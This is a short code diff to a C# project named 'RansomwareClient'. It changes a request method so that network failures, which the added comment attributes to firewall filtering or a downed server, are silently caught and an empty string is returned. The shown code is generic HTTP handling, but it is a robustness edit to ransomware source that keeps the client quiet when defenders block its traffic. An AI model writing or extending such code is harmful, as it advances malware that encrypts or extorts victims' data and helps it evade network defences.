@@ -41,12 +41,18 @@ namespace RansomwareClient
                     stream.Write(body, 0, body.Length);
                 }
             }
-            using (HttpWebResponse response = (HttpWebResponse)request.GetResponse())
-            using (var stream = response.GetResponseStream())
-            using (var reader = new StreamReader(stream))
+            try
             {
-                return reader.ReadToEnd();
+                using (HttpWebResponse response = (HttpWebResponse)request.GetResponse())
+                using (var stream = response.GetResponseStream())
+                using (var reader = new StreamReader(stream))
+                {
+                    return reader.ReadToEnd();
+                }
             }
+            catch (WebException){ }  //filtered/blocked/serverdown e.g. firewall
+            return string.Empty;
+
         }
     }
 }
